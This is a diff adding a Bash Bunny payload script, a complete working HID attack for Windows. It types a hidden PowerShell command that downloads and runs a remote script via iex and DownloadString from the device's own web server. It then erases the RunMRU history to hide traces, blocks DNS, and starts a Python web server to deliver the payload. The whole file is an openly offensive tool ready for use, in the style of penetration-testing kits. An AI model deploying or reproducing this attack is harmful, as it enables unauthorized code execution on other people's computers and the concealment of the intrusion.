@@ -1,0 +1,62 @@
+#!/bin/bash
+#
+# Title:         Powershell Download and Execute
+# Author:        LowValueTarget
+# Version:       1.0
+# Category:      Powershell
+# Target:        Windows XP SP3+ (Powershell)
+# Attackmodes:   HID, Ethernet
+# 
+# Quick HID attack to retrieve and run powershell payload from BashBunny web server - ensure psh.txt exists in payload directory
+# 
+# Amber Blink Fast.....Initialization
+# Red..................No psh.txt present in payload directory (powershell payload)
+# Blue Blink Fast......HID Stage
+# White Blink Fast.....Ethernet Stage
+# Green................Finished
+#
+LED R G 100
+source bunny_helpers.sh
+
+# Set working dir
+PAYLOAD_DIR=/root/udisk/payloads/$SWITCH_POSITION
+cd $PAYLOAD_DIR
+
+# Check for psh.txt
+if [ ! -f $PAYLOAD_DIR/psh.txt ]; then
+    LED R
+    exit 1
+fi
+
+# Attack HID
+ATTACKMODE HID
+LED B 100
+
+Q GUI r
+Q DELAY 500
+# Wait for IP then download powershell script and run it
+Q STRING "powershell -WindowStyle Hidden \"while (\$true) { If (Test-Connection 172.16.64.1 -count 1 -quiet) { sleep 1; iex (New-Object Net.WebClient).DownloadString('http://172.16.64.1/psh.txt'); exit } }\""
+Q ENTER
+
+# Ninja vanish
+Q DELAY 500
+Q GUI r
+Q DELAY 500
+# Clear recent run history
+Q STRING "powershell -WindowStyle Hidden -Exec Bypass \"Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue\""
+Q ENTER
+
+# Attack Ethernet
+LED R G B 500
+ATTACKMODE RNDIS_ETHERNET
+sleep 2
+
+# Start web server
+iptables -A OUTPUT -p udp --dport 53 -j DROP # disallow outgoing dns requests so server starts immediately
+python -m SimpleHTTPServer 80 &
+
+# wait until python web server is listening
+while ! nc -z localhost 80; do sleep 0.2; done
+
+sleep 2 # Wait to ensure powershell download, should be instant
+LED G
